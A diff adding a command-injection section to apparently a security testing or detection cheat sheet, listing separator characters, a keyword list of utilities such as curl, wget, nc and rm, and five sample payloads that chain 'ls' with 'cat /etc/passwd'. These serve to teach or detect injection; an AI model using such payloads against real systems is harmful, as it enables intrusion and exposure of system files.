@@ -60,7 +60,19 @@
 
 -- Command Injection --
 
+• Executing arbitrary OS commands
+• Look for special characters that separate commands
+  → ;, ||, &&
+• Look for references to commands or utilities
+  → ls, echo, bash, cat, cd, cmd.exe, curl, wget
+  → ping, sudo, chmod, rm, nc, nc.exe, sh
+• URL-encoded injection characters
 
+ls; cat /etc/passwd
+ls || cat /etc/passwd
+ls /notexists || cat /etc/passwd
+ls && cat /etc/passwd
+ls /notexists && cat /etc/passwd
 
 
 -- Path Traversal and LFI --
